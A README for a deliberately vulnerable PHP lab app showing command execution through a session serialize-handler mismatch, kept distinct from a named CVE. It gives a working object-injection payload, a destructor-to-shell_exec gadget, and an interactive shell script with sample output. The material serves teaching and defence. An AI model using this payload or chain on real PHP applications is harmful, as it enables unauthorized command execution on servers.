# exec-lab — command execution via the session handler mismatch

**This is not CVE-2026-109618 / CVE-2026-109619.** It is a deliberately
vulnerable two-endpoint application demonstrating the `php_serialize` ↔ `php`
delimiter mismatch: a session value written by one handler is split at `|` by the
other, and the remainder is unserialized. The reader then executes a command from
the injected object. Works on any PHP version, patched or not.

It exists so you can see exactly what the circulating "php2shell Chain 2" does,
without confusing it for the CVE.

```bash
./run.sh start
python3 shell.py -c id
python3 shell.py                 # interactive: cmd> uname -a
./run.sh stop
```

Interactively:

```
cmd> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
cmd> uname -s
Linux
```

The uid is whichever user Apache runs as — root-started Apache gives `www-data`,
a user-started one gives that user.

## How it works

| Piece | Handler | Role |
|---|---|---|
| `/app/index.php` | `php_serialize` | stores `$_SESSION['note']` verbatim |
| `/api/index.php` | `php` | defines `Runner`, calls `session_start()` |

Injecting `x|O:6:"Runner":1:{s:3:"cmd";s:2:"id";}` produces:

```
a:1:{s:4:"note";s:22:"x|O:6:"Runner":1:{s:3:"cmd";s:2:"id";}";}
```

The `php` handler finds the first `|` **inside the string**, treats the rest as a
serialized value, and creates `Runner` with `cmd=id`. Decoding then fails on the
trailing `";}` — *after* the object exists, so `__destruct` fires and runs
`shell_exec($cmd)`. Output is written to `api/out.txt` because the destructor runs
at shutdown, after the response body is already sent.

## Why the CVE is different

CVE-2026-109618 is OOM state corruption during request startup; it needs no
mismatch, no gadget and no LFI. What it does not give you is a convenient `|`
injection point — that is this misconfiguration, not the bug. See
`../../analysis/FINDINGS.md`.

## Requirements and safety

- Debian/Kali Apache module paths, `libapache2-mod-php8.4`.
- `shell_exec` enabled; `/tmp/exec-lab` writable.
- Binds 127.0.0.1 only. This endpoint grants command execution as the web user
  to anyone who can reach it — never bind it publicly, never point it at a
  network interface.
